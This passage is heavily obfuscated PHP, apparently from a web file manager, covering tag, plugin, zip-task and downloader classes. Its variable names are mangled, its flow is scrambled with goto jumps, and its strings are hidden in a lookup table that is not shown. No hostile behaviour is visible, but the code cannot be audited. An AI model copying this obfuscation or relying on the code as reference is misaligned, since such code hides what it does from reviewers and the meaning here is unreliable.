"\165\x73\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($b±ìó†Íäì) { $Cïô‹íŞ¯‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($Cïô‹íŞ¯‚[2208] => array($b±ìó†Íäì[0], $Cïô‹íŞ¯‚[2209]), $Cïô‹íŞ¯‚[2210] => array($b±ìó†Íäì[0], $Cïô‹íŞ¯‚[2211])); } protected function get($B¡¥²ƒ±áë) { $Cíò‚­ÒÜõ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bãŸ®‘Ï = Model($Cíò‚­ÒÜõ[469])->metaGet($B¡¥²ƒ±áë, $Cíò‚­ÒÜõ[2212]); $AÊäõç” = json_decode($bãŸ®‘Ï, !0); return $AÊäõç” ? $AÊäõç” : array($Cíò‚­ÒÜõ[2213] => $Cíò‚­ÒÜõ[93], $Cíò‚­ÒÜõ[363] => array()); } protected function set($D¡‹ĞõÊÃ, $a÷ì‹Ş‡ƒ) { $A¸ğÍà¼ä =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a÷ì‹Ş‡ƒ = $a÷ì‹Ş‡ƒ ? $a÷ì‹Ş‡ƒ : array($A¸ğÍà¼ä[2213] => $A¸ğÍà¼ä[93], $A¸ğÍà¼ä[363] => array()); Model($A¸ğÍà¼ä[469])->metaSet($D¡‹ĞõÊÃ, $A¸ğÍà¼ä[2212], json_encode($a÷ì‹Ş‡ƒ)); return Model($A¸ğÍà¼ä[469])->metaSet($D¡‹ĞõÊÃ, $A¸ğÍà¼ä[2212], json_encode($a÷ì‹Ş‡ƒ)); } protected function getByTagID($b¿»Ä‰ôíÃ, $f®±À”ç¬ƒ) { goto C›á›È„ ´; C›á›È„ ´: $BëĞÌ²è­ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$b¿»Ä‰ôíÃ || !$f®±À”ç¬ƒ) { return !1; } if (!Model($BëĞÌ²è­[469])->getInfoSimple($b¿»Ä‰ôíÃ)) { return !1; } goto Dë¦åˆ§Ÿ; eƒÚ×¼‘¾ê: return is_array($d„ò¯òÉŒ½) ? $d„ò¯òÉŒ½ : !1; goto D²ìî‰÷Üõ; Dë¦åˆ§Ÿ: $D˜Åè£ƒÍ = $this->get($b¿»Ä‰ôíÃ); if (!$D˜Åè£ƒÍ || !isset($D˜Åè£ƒÍ[$BëĞÌ²è­[363]])) { return !1; } $d„ò¯òÉŒ½ = array_find_by_field($D˜Åè£ƒÍ[$BëĞÌ²è­[363]], $BëĞÌ²è­[376], $f®±À”ç¬ƒ); goto eƒÚ×¼‘¾ê; D²ìî‰÷Üõ: } public function listSource($cè¨ĞğÅİ, $BÊ«²Ç¥†¿) { goto B®¤Õ—Ê£ß; aô’ø®×¡‚: if (!$DÒìéˆç¢ || count($fïÅ«éÁ¨) == $DÒìéˆç¢[$cëöíØ[360]][$cëöíØ[361]]) { return $DÒìéˆç¢; } $eØÓñ‚Ü‚à = array(); $D¿Çò¼ğğİ = array_to_keyvalue($DÒìéˆç¢[$cëöíØ[84]], $cëöíØ[43], $cëöíØ[378]); goto Có¼ÊÀëœ; B®¤Õ—Ê£ß: $cëöíØ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($BÊ«²Ç¥†¿ && !is_array($BÊ«²Ç¥†¿)) { $BÊ«²Ç¥†¿ = array($BÊ«²Ç¥†¿); } $D¯–˜Å‹‚µ = $this->listData($cè¨ĞğÅİ); goto cŒÑÌ’ª–¡; Có¼ÊÀëœ: $f„îßºí‚µ = array_to_keyvalue($DÒìéˆç¢[$cëöíØ[83]], $cëöíØ[43], $cëöíØ[378]); $AœÖĞĞ¾…° = array_merge($f„îßºí‚µ, $D¿Çò¼ğğİ); foreach ($fïÅ«éÁ¨ as $Dİ®¢„Ç…ë) { if (!in_array($Dİ®¢„Ç…ë, $AœÖĞĞ¾…°)) { $eØÓñ‚Ü‚à[] = $Dİ®¢„Ç…ë; } } goto eù˜‚†¡; eù˜‚†¡: if ($eØÓñ‚Ü‚à) { $this->removeBySource($cè¨ĞğÅİ, $eØÓñ‚Ü‚à); } return $DÒìéˆç¢; goto D³¿‰’É¶î; cŒÑÌ’ª–¡: $b©Œ‘ÖÖ” = array(); foreach ($D¯–˜Å‹‚µ as $aĞ¾†”äˆ) { $Dİ®¢„Ç…ë = $aĞ¾†”äˆ[$cëöíØ[85]]; if (!$Dİ®¢„Ç…ë) { continue; } if (!isset($b©Œ‘ÖÖ”[$Dİ®¢„Ç…ë])) { $b©Œ‘ÖÖ”[$Dİ®¢„Ç…ë] = array(); } $b©Œ‘ÖÖ”[$Dİ®¢„Ç…ë][] = $aĞ¾†”äˆ[$cëöíØ[402]]; } $fïÅ«éÁ¨ = array(); goto añø”Íºõ; añø”Íºõ: foreach ($b©Œ‘ÖÖ” as $F“»æİª => $A‚·×ëÙ‰Ã) { $D³ÂìÍß· = !0; if (!$BÊ«²Ç¥†¿) { $fïÅ«éÁ¨[] = $F“»æİª; continue; } foreach ($BÊ«²Ç¥†¿ as $A–Éø­Äæ‰) { if (!in_array($A–Éø­Äæ‰, $A‚·×ëÙ‰Ã)) { $D³ÂìÍß· = !1; break; } } if ($D³ÂìÍß·) { $fïÅ«éÁ¨[] = $F“»æİª; } } if (!$fïÅ«éÁ¨) { return array(); } $DÒìéˆç¢ = Model($cëöíØ[1124])->listSource(array($cëöíØ[392] => array($cëöíØ[393], $fïÅ«éÁ¨))); goto aô’ø®×¡‚; D³¿‰’É¶î: } protected function listData($aöóöä¥§ï) { $a†ÄÜ–ÖÆó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c„Å…‚Œ… = array($a†ÄÜ–ÖÆó[1434] => 0, $a†ÄÜ–ÖÆó[445] => array($a†ÄÜ–ÖÆó[2214], 0), $a†ÄÜ–ÖÆó[397] => $a†ÄÜ–ÖÆó[2215] . $aöóöä¥§ï); $CåäÜøãÁ‹ = $a†ÄÜ–ÖÆó[2216]; $A‰¨í‹«¸ß = $this->field($CåäÜøãÁ‹)->where($c„Å…‚Œ…)->order($a†ÄÜ–ÖÆó[2217])->select(); return $A‰¨í‹«¸ß ? $A‰¨í‹«¸ß : array(); } protected function addToTag($dÚß­Çˆ³…, $b¼Òèñ³Ä, $Bğ­‡‚Å˜í) { $cíÔë·èÉÀ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->getByTagID($dÚß­Çˆ³…, $Bğ­‡‚Å˜í) || !$b¼Òèñ³Ä) { return !1; } if (!Model($cíÔë·èÉÀ[761])->pathInfo($b¼Òèñ³Ä)) { return !1; } $bîêÌéó˜ = array($cíÔë·èÉÀ[1434] => 0, $cíÔë·èÉÀ[445] => $Bğ­‡‚Å˜í, $cíÔë·èÉÀ[396] => $b¼Òèñ³Ä, $cíÔë·èÉÀ[397] => $cíÔë·èÉÀ[2218] . $dÚß­Çˆ³…, $cíÔë·èÉÀ[395] => $cíÔë·èÉÀ[43], $cíÔë·èÉÀ[2118] => 0); if ($this->where($bîêÌéó˜)->find()) { return !1; } return $this->add($bîêÌéó˜); } protected function removeFromTag($fêĞ‹½’, $DÊ×´ƒ±Ë, $fºÖ‚•¡) { $f§Ö®ˆŞ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->getByTagID($fêĞ‹½’, $fºÖ‚•¡) || !$DÊ×´ƒ±Ë) { return !1; } if (is_array($DÊ×´ƒ±Ë)) { $DÊ×´ƒ±Ë = array($f§Ö®ˆŞ[17], $DÊ×´ƒ±Ë); } $B‰†¿¢Ô = array($f§Ö®ˆŞ[1434] => 0, $f§Ö®ˆŞ[445] => $fºÖ‚•¡, $f§Ö®ˆŞ[397] => $f§Ö®ˆŞ[2218] . $fêĞ‹½’, $f§Ö®ˆŞ[396] => $DÊ×´ƒ±Ë); return $this->where($B‰†¿¢Ô)->delete(); } protected function removeByTag($aÍéóòò„–, $aµô³…ƒ£) { $Dï‡÷¢¸Í² =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->getByTagID($aÍéóòò„–, $aµô³…ƒ£)) { return !1; } $e½õÄ±Ãçå = array($Dï‡÷¢¸Í²[1434] => 0, $Dï‡÷¢¸Í²[445] => $aµô³…ƒ£, $Dï‡÷¢¸Í²[397] => $Dï‡÷¢¸Í²[2218] . $aÍéóòò„–); return $this->where($e½õÄ±Ãçå)->delete(); } protected function removeBySource($Aé¢ªºÚœ, $fŸé­…¸Êâ) { $cêĞö‡Æ‹… =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$Aé¢ªºÚœ || !$fŸé­…¸Êâ) { return !1; } if (is_array($fŸé­…¸Êâ)) { $fŸé­…¸Êâ = array($cêĞö‡Æ‹…[17], $fŸé­…¸Êâ); } $eÅÙ”ËÎ™ = array($cêĞö‡Æ‹…[1434] => 0, $cêĞö‡Æ‹…[396] => $fŸé­…¸Êâ, $cêĞö‡Æ‹…[445] => array($cêĞö‡Æ‹…[934], 0), $cêĞö‡Æ‹…[397] => $cêĞö‡Æ‹…[2218] . $Aé¢ªºÚœ); return $this->where($eÅÙ”ËÎ™)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\160\x6c\165\147\151\156\114\151\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x73\x74\141\x74\165\x73", "\x72\145\147\151\x65\x73\x74", "\x63\x6f\x6e\146\151\147"); public function loadList($E¼íÆÎ¸± = false) { $f†§õà²® = array_to_keyvalue($this->listData(), $_SERVER[çŞáÓæÚô‚Ô‡][38]); if ($E¼íÆÎ¸±) { return $f†§õà²®[$E¼íÆÎ¸±]; } return $f†§õà²®; } public function init() { $dÏ ö˜íÆÏ =& $_SERVER[çŞáÓæÚô‚Ô‡]; Hook::trigger($dÏ ö˜íÆÏ[2219]); $CÀ»ºí‡œ¯ = $this->loadPluginList(); foreach ($CÀ»ºí‡œ¯ as $bÎôÓŒàò => $Fëïğ™ê‡) { $BÄòŠ‰Ô“Û = $this->appAllow($bÎôÓŒàò, $Fëïğ™ê‡); if (!$BÄòŠ‰Ô“Û) { continue; } foreach ($Fëïğ™ê‡[$dÏ ö˜íÆÏ[2220]] as $cºîåâÌ¦¢ => $DÒˆªÜô®) { Hook::bind($cºîåâÌ¦¢, $DÒˆªÜô®); } } Hook::trigger($dÏ ö˜íÆÏ[2221]); Hook::trigger(ACTION); } public function appAllow($a°áÜ£É, $C…ì‚Œ›«, $eŸ«áÁ®ôô = true) { $e†½ó¦Ë¿± =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÍÄ¤éÚğ = PLUGIN_DIR . $a°áÜ£É . $e†½ó¦Ë¿±[2222]; if (!is_array($C…ì‚Œ›«) || !is_array($C…ì‚Œ›«[$e†½ó¦Ë¿±[2220]]) || !is_file($BÍÄ¤éÚğ) || $C…ì‚Œ›«[$e†½ó¦Ë¿±[698]] != 1) { return !1; } if ($eŸ«áÁ®ôô && !Action($e†½ó¦Ë¿±[2223])->checkAuth($a°áÜ£É)) { return !1; } return !0; } public function unInstall($CÁ¸Ê©¼Í) { $Fš³—¼æ‚ë =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÁÕî—òÚô = $this->loadList($CÁ¸Ê©¼Í); if (file_exists(PLUGIN_DIR . $CÁ¸Ê©¼Í)) { Hook::apply($CÁ¸Ê©¼Í . $Fš³—¼æ‚ë[2224]); } $this->remove($AÁÕî—òÚô[$Fš³—¼æ‚ë[376]]); } public function changeStatus($Aˆ²óìæºæ, $BØóë†”„¢) { $B­•ğ‡ïï” =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f¾…§ÏÖ¡ = $this->loadList($Aˆ²óìæºæ); if ($BØóë†”„¢) { Hook::apply($Aˆ²óìæºæ . $B­•ğ‡ïï”[2225]); } $this->update($f¾…§ÏÖ¡[$B­•ğ‡ïï”[376]], array($B­•ğ‡ïï”[2226] => $BØóë†”„¢)); } public function appRegist($eíöè°ŒÒÚ, $D÷½ÓÇñ¾) { $eóœÉªß˜ô =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Aßº“«Ãæ† = $this->loadList($eíöè°ŒÒÚ); if ($Aßº“«Ãæ†) { $this->update($Aßº“«Ãæ†[$eóœÉªß˜ô[376]], array($eóœÉªß˜ô[2220] => $D÷½ÓÇñ¾)); } else { $c¥Óª‘™Ñ = array($eóœÉªß˜ô[38] => $eíöè°ŒÒÚ, $eóœÉªß˜ô[2220] => $D÷½ÓÇñ¾, $eóœÉªß˜ô[698] => 0, $eóœÉªß˜ô[16] => $this->getConfigDefault($eíöè°ŒÒÚ)); $this->insert($c¥Óª‘™Ñ); } } public function getConfigDefault($F‚Áø…†à…) { $CøÑìäôå =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FáâåÆø¦ê = array(); $eğË ›öˆõ = $this->getPackageJson($F‚Áø…†à…); if (!$eğË ›öˆõ && is_array($eğË ›öˆõ[$CøÑìäôå[2227]])) { return $FáâåÆø¦ê; } foreach ($eğË ›öˆõ[$CøÑìäôå[2227]] as $aÎ“¥î‰” => $déÈ‹ï÷ÉÀ) { if (!isset($déÈ‹ï÷ÉÀ[$CøÑìäôå[368]]) || isset($FáâåÆø¦ê[$aÎ“¥î‰”])) { continue; } $FáâåÆø¦ê[$aÎ“¥î‰”] = $déÈ‹ï÷ÉÀ[$CøÑìäôå[368]]; } return $FáâåÆø¦ê; } public function getPackageJson($d¡×ùƒô¼) { return Hook::apply($d¡×ùƒô¼ . $_SERVER[çŞáÓæÚô‚Ô‡][2228]); } public function getConfig($f…ƒóÆã®, $b‘äÜãòêã = false) { $EŞ¸ğéÂ×ì =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eƒ¾µ¼èŒ± = array(); $A¶­Ö°¬µ = $this->loadList($f…ƒóÆã®); if ($A¶­Ö°¬µ && is_array($A¶­Ö°¬µ[$EŞ¸ğéÂ×ì[16]])) { $eƒ¾µ¼èŒ± = $A¶­Ö°¬µ[$EŞ¸ğéÂ×ì[16]]; } if (!$eƒ¾µ¼èŒ± || $b‘äÜãòêã) { $eƒ¾µ¼èŒ± = $this->getConfigDefault($f…ƒóÆã®); } return $eƒ¾µ¼èŒ±; } public function setConfig($aŒ¶®µÙÛë, $EÃŠ¹Ù£Œ÷ = false) { goto EïÄôêé®‰; f³ô›š¡‰: $this->update($Cˆ‡½Ö“ÔÉ[$B„†ØÓÏ½Œ[376]], array($B„†ØÓÏ½Œ[16] => $Fßáä¥‹ä)); goto aê±‡Çê¤Á; EïÄôêé®‰: $B„†ØÓÏ½Œ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cˆ‡½Ö“ÔÉ = $this->loadList($aŒ¶®µÙÛë); if (!$Cˆ‡½Ö“ÔÉ) { return !1; } goto B†¢Ô±—˜³; B†¢Ô±—˜³: $Fßáä¥‹ä = $Cˆ‡½Ö“ÔÉ[$B„†ØÓÏ½Œ[16]]; if ($EÃŠ¹Ù£Œ÷ == !1) { $Fßáä¥‹ä = array(); $EÃŠ¹Ù£Œ÷ = $this->getConfigDefault($aŒ¶®µÙÛë); } foreach ($EÃŠ¹Ù£Œ÷ as $dóó¢¾ˆ  => $F¹ç¨à‚­Ø) { $Fßáä¥‹ä[$dóó¢¾ˆ ] = is_string($F¹ç¨à‚­Ø) ? trim($F¹ç¨à‚­Ø) : $F¹ç¨à‚­Ø; } goto f³ô›š¡‰; aê±‡Çê¤Á: } public function viewList() { goto e»Ïâ–Ë¯„; aÀÚÛ‘ê¡Û: $AŒˆ°ÀÚö = $this->loadPluginList(); $d¶ÛÚœ¥† = array(); foreach ($AŒˆ°ÀÚö as $f«¢ÃÑ·•™ => $aÁĞ‚’ŒéÑ) { unset($aÁĞ‚’ŒéÑ[$CÑ´ã¶£Â[2220]], $aÁĞ‚’ŒéÑ[$CÑ´ã¶£Â[16]]); $aï³¥×óÓ‚ = PLUGIN_DIR . $aÁĞ‚’ŒéÑ[$CÑ´ã¶£Â[38]] . $CÑ´ã¶£Â[2222]; if (!is_file($aï³¥×óÓ‚)) { continue; } $aÉíÔß´ˆ = Hook::apply($aÁĞ‚’ŒéÑ[$CÑ´ã¶£Â[38]] . $CÑ´ã¶£Â[2228]); if (is_array($aÉíÔß´ˆ)) { $d¶ÛÚœ¥†[$f«¢ÃÑ·•™] = array_merge($aÁĞ‚’ŒéÑ, $aÉíÔß´ˆ); } } goto AƒÁ”‹Õ¾Ç; e»Ïâ–Ë¯„: $CÑ´ã¶£Â =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AŒˆ°ÀÚö = $this->loadList(); $this->pluginScan($AŒˆ°ÀÚö); goto aÀÚÛ‘ê¡Û; AƒÁ”‹Õ¾Ç: return $d¶ÛÚœ¥†; goto cŒìÅÉâÖ±; cŒìÅÉâÖ±: } private function loadPluginList() { $B²Ù¬æ«ŸÃ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÏ£½åîª¡ = $this->loadList(); if (strtolower(MOD) == $B²Ù¬æ«ŸÃ[2229]) { return $BÏ£½åîª¡; } $d™¾¥ºè´ = Hook::trigger($B²Ù¬æ«ŸÃ[2230], $BÏ£½åîª¡); if ($BÏ£½åîª¡ && !$d™¾¥ºè´) { die; } return $d™¾¥ºè´ ? $d™¾¥ºè´ : $BÏ£½åîª¡; } private function pluginScan($E¦ç†ŸŒ·Ş) { $dìâ›Ğ³¬ß =& $_SERVER[çŞáÓæÚô‚Ô‡]; recursion_dir(PLUGIN_DIR, $eæ¤é…ï‹, $CĞ‰¾¶‰ñØ, 0); foreach ($eæ¤é…ï‹ as $a‚ËÏÄéˆ) { $Bñ¦‹…×Ÿ‹ = get_path_this($a‚ËÏÄéˆ); if (isset($E¦ç†ŸŒ·Ş[$Bñ¦‹…×Ÿ‹]) || !file_exists($a‚ËÏÄéˆ . $dìâ›Ğ³¬ß[2231]) || !file_exists($a‚ËÏÄéˆ . $dìâ›Ğ³¬ß[2222])) { continue; } Hook::apply($Bñ¦‹…×Ÿ‹ . $dìâ›Ğ³¬ß[2225]); } } } goto eÚ¨–¡ÓÜ†; D—ƒÏî»Ì¤: function beforeShutdown() { Hook::trigger($_SERVER[·ü][32]); } $_SERVER[$_SERVER[·ü][33]] = BASIC_PATH; $_SERVER[$_SERVER[·ü][34]] = LIB_DIR; goto E’Æç‘­ñˆ; bŠÀÛà ·ø: class TaskZip extends TaskFileTransfer { protected function startAfter() { $Aˆ˜ƒï—áâ =& $_SERVER[çŞáÓæÚô‚Ô‡]; parent::startAfter(); Hook::bind($Aˆ˜ƒï—áâ[1519], array($this, $Aˆ˜ƒï—áâ[1514])); $EÄÙíáÚ¦§ =& $this->task; $EÄÙíáÚ¦§[$Aˆ˜ƒï—áâ[1516]] = $Aˆ˜ƒï—áâ[1047]; if (!$EÄÙíáÚ¦§[$Aˆ˜ƒï—áâ[1349]]) { $EÄÙíáÚ¦§[$Aˆ˜ƒï—áâ[1349]] = LNG($Aˆ˜ƒï—áâ[1520]); } } protected function endAfter() { $FÖ‘ó•åÀó =& $_SERVER[çŞáÓæÚô‚Ô‡]; parent::endAfter(); Hook::unbind($FÖ‘ó•åÀó[1519], array($this, $FÖ‘ó•åÀó[1514])); } public function updateAfter() { $EÒÙØ‰•¡Œ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DˆĞŒÜ—— =& $this->task; if (!$DˆĞŒÜ——[$EÒÙØ‰•¡Œ[983]] || !$DˆĞŒÜ——[$EÒÙØ‰•¡Œ[707]]) { return; } if ($DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1516]] == $EÒÙØ‰•¡Œ[1047]) { $f„ïóùŸ…Ü = $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1489]]; if ($DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1490]] != $EÒÙØ‰•¡Œ[1047]) { $f„ïóùŸ…Ü = 0; } $dë§ÀËÍ¼‰ = ($DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1493]] + $f„ïóùŸ…Ü) / $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[707]]; $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1444]] = $dë§ÀËÍ¼‰ * 0.3; } else { if ($DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1516]] == $EÒÙØ‰•¡Œ[310]) { $dë§ÀËÍ¼‰ = $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[997]] / $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[983]]; $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1444]] = 0.3 + $dë§ÀËÍ¼‰ * 0.5; } else { if ($DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1516]] == $EÒÙØ‰•¡Œ[113]) { $dë§ÀËÍ¼‰ = 0; if ($DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1488]]) { $dë§ÀËÍ¼‰ = $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1489]] / $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1488]]; } $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1444]] = 0.3 + 0.5 + $dë§ÀËÍ¼‰ * 0.2; } } } if ($DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1444]] > 0) { $D™‘•œèÏï = timeFloat() - $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1446]] - $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1449]]; $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1450]] = $D™‘•œèÏï * (1 - $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1444]]) / $DˆĞŒÜ——[$EÒÙØ‰•¡Œ[1444]]; } } public function copyFileStart($BÒºßœ®†‘, $d†•ì‘´ÍŸ, $aÔğ†Ñ¶ñ, $cŒç¥††¿‰, $e”ì™¼ì¢, $D’Ú–íï) { $bÅŒÂõº˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; parent::copyFileStart($BÒºßœ®†‘, $d†•ì‘´ÍŸ, $aÔğ†Ñ¶ñ, $cŒç¥††¿‰, $e”ì™¼ì¢, $D’Ú–íï); $BôÑ‚¼…Ş =& $this->task; if ($BôÑ‚¼…Ş[$bÅŒÂõº˜[1516]] == $bÅŒÂõº˜[310]) { $BôÑ‚¼…Ş[$bÅŒÂõº˜[1516]] = $bÅŒÂõº˜[113]; } $this->update(); } public function copyFileEnd($a„”µô…ºÔ, $cØê¨æÁñÈ, $b”Õ±ÚèË”, $b¼Ÿí‚­¸, $Bêµ›ÏÔ, $F¨¹£Â‰æÌ) { $FÒùá¸ö÷‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cØÛ¥ÖòŠ› =& $this->task; $cØÛ¥ÖòŠ›[$FÒùá¸ö÷‰[1489]] = $cØÛ¥ÖòŠ›[$FÒùá¸ö÷‰[1488]]; $cØÛ¥ÖòŠ›[$FÒùá¸ö÷‰[1493]] += $cØÛ¥ÖòŠ›[$FÒùá¸ö÷‰[1488]]; $cØÛ¥ÖòŠ›[$FÒùá¸ö÷‰[1490]] = $FÒùá¸ö÷‰[43]; $this->update(); } public function nameParse($D¨ËÇ¦Ä…) { $CË„·øëÆÊ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FÒ·ö±¸Å =& $this->task; if ($FÒ·ö±¸Å[$CË„·øëÆÊ[997]] < $FÒ·ö±¸Å[$CË„·øëÆÊ[983]]) { $d©©‹»Ø† = get_path_this($D¨ËÇ¦Ä…); if (strstr($d©©‹»Ø†, $CË„·øëÆÊ[101])) { $FÒ·ö±¸Å[$CË„·øëÆÊ[997]] += 1; } } if ($FÒ·ö±¸Å[$CË„·øëÆÊ[1516]] == $CË„·øëÆÊ[1047]) { $FÒ·ö±¸Å[$CË„·øëÆÊ[1516]] = $CË„·øëÆÊ[310]; } $FÒ·ö±¸Å[$CË„·øëÆÊ[1486]] = $D¨ËÇ¦Ä…; $this->update(); } } class Downloader { static function start($b•±ÍÛôêí, $AËØ›·ïÄ, $Fô”ŸÎç•‰ = 10) { goto Aµƒ·’«Àƒ; cæìÂÅù¿: if (!$b•±ÍÛôêí) { return array($e³Ã÷Õ‚†—[1039] => !1, $e³Ã÷Õ‚†—[1041] => $e³Ã÷Õ‚†—[1044]); } if (!$có¼ÀÓÀã[$e³Ã÷Õ‚†—[1295]] || $có¼ÀÓÀã[$e³Ã÷Õ‚†—[334]] == 0) { @unlink($Cƒ¤‚ôã¿ä); @unlink($AËØ›·ïÄ); $aì¿é£ßŞ = self::fileDownloadFopen($b•±ÍÛôêí, $AËØ›·ïÄ, $có¼ÀÓÀã[$e³Ã÷Õ‚†—[334]]); if ($aì¿é£ßŞ[$e³Ã÷Õ‚†—[1039]]) { return $aì¿é£ßŞ; } else { @unlink($Cƒ¤‚ôã¿ä); @unlink($AËØ›·ïÄ); $aì¿é£ßŞ = self::fileDownloadCurl($b•±ÍÛôêí, $AËØ›·ïÄ, !1, 0, $có¼ÀÓÀã[$e³Ã÷Õ‚†—[334]]); @unlink($Cƒ¤‚ôã¿ä); return $aì¿é£ßŞ; } } $cãŸ¨…óê = is_file($Cƒ¤‚ôã¿ä) ? filesize($Cƒ¤‚ôã¿ä) : 0; goto f›°ÄĞÆŞÙ; A¦Ü ñí½‰: $Cƒ¤‚ôã¿ä = $AËØ›·ïÄ . $e³Ã÷Õ‚†—[1522]; if (is_array($b•±ÍÛôêí)) { $có¼ÀÓÀã = $b•±ÍÛôêí; } else { $có¼ÀÓÀã = url_header($b•±ÍÛôêí); } $b•±ÍÛôêí = $có¼ÀÓÀã[$e³Ã÷Õ‚†—[304]]; goto cæìÂÅù¿; Aµƒ·’«Àƒ: $e³Ã÷Õ‚†— =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!request_url_safe($b•±ÍÛôêí)) { return array($e³Ã÷Õ‚†—[1039] => !1, $e³Ã÷Õ‚†—[1041] => $e³Ã÷Õ‚†—[1044]); } $fÕ‚î¢Àô = $AËØ›·ïÄ . $e³Ã÷Õ‚†—[1521]; goto A¦Ü ñí½‰; F¾Ìè  ¯: if ($cãŸ¨…óê > $Bß¥¦ĞÈâ·) { @unlink($Cƒ¤‚ôã¿ä); } file_put_contents($fÕ‚î¢Àô, json_encode($Dß’äèè–á)); $aì¿é£ßŞ = self::fileDownloadCurl($b•±ÍÛôêí, $AËØ›·ïÄ, !0, $cãŸ¨…óê, $Bß¥¦ĞÈâ·); goto F­–»¯èô; F­–»¯èô: if ($aì¿é£ßŞ[$e³Ã÷Õ‚†—[1039]]) { @unlink($fÕ‚î¢Àô); } return $aì¿é£ßŞ; goto c·¾œââ–À; FïÒ—…˜: if (is_file($fÕ‚î¢Àô)) { $c„³ÈÔ»— = file_get_contents($fÕ‚î¢Àô); $Dß’äèè–á = json_decode($c„³ÈÔ»—, 1); } if (file_exists($AËØ›·ïÄ) && $Bß¥¦ĞÈâ· == filesize($AËØ›·ïÄ)) { @unlink($Cƒ¤‚ôã¿ä); @unlink($fÕ‚î¢Àô); return array($e³Ã÷Õ‚†—[1039] => !0, $e³Ã÷Õ‚†—[1041] => $e³Ã÷Õ‚†—[1524]); } if ($Dß’äèè–á[$e³Ã÷Õ‚†—[334]] != $Bß¥¦ĞÈâ·) { $Dß’äèè–á = array($e³Ã÷Õ‚†—[334] => $Bß¥¦ĞÈâ·); } goto F¾Ìè  ¯; f›°ÄĞÆŞÙ: $Bß¥¦ĞÈâ· = intval($có¼ÀÓÀã[$e³Ã÷Õ‚†—[334]]); if (file_exists($Cƒ¤‚ôã¿ä) && time() - filemtime($Cƒ¤‚ôã¿ä) < 3) { return array($e³Ã÷Õ‚†—[1039] => !1, $e³Ã÷Õ‚†—[1041] => $e³Ã÷Õ‚†—[1523]); } $Dß’äèè–á = array(); goto FïÒ—…˜; c·¾œââ–À: } static function fileDownloadFopen($Aˆ—ĞîØÏ‰, $F¦ï¶ğõä, $DËóÜ¿èéä = 0) { $a¾ôÜÔ˜¢¶ =& $_SERVER[çŞáÓæÚô‚Ô‡]; @ini_set($a¾ôÜÔ˜¢¶[1525], $a¾ôÜÔ˜¢¶[1526]); $fÛ§‘ĞŠÂª = $F¦ï¶ğõä . $a¾ôÜÔ˜¢¶[1522]; set_timeout(); @unlink($fÛ§‘ĞŠÂª); if ($F²ñ·õÍÆ = @fopen($Aˆ—ĞîØÏ‰, $a¾ôÜÔ˜¢¶[1527])) { goto fÃ„¦äœëê; Eöš—¾‹: return array($a¾ôÜÔ˜¢¶[1039] => !0, $a¾ôÜÔ˜¢¶[1041] => $a¾ôÜÔ˜¢¶[705]); goto C×§Üæ “; fÃ„¦äœëê: if (!($Aô²ÒœˆÃ = @fopen($fÛ§‘ĞŠÂª, $a¾ôÜÔ˜¢¶[1528]))) { return array($a¾ôÜÔ˜¢¶[1039] => !1, $a¾ôÜÔ˜¢¶[1041] => $a¾ôÜÔ˜¢¶[1529]); } while (!feof($F²ñ·õÍÆ)) { if (!file_exists($fÛ§‘ĞŠÂª)) { fclose($Aô²ÒœˆÃ); return array($a¾ôÜÔ˜¢¶[1039] => !1, $a¾ôÜÔ˜¢¶[1041] => $a¾ôÜÔ˜¢¶[1530]); } clearstatcache(); if ($DËóÜ¿èéä > 0 && $DËóÜ¿èéä == filesize(iconv_system($fÛ§‘ĞŠÂª))) { break; } fwrite($Aô²ÒœˆÃ, fread($F²ñ·õÍÆ, 1024 * 8), 1024 * 8); } fclose($Aô²ÒœˆÃ); goto bù¾Û¨¿Û¸; bù¾Û¨¿Û¸: fclose($F²ñ·õÍÆ); self::checkGzip($fÛ§‘ĞŠÂª); if (!@rename($fÛ§‘ĞŠÂª, $F¦ï¶ğõä)) { usleep(round(rand(0, 1000) * 50)); @unlink($F¦ï¶ğõä); $eµ•åÔíäé = @rename($fÛ§‘ĞŠÂª, $F¦ï¶ğõä); if 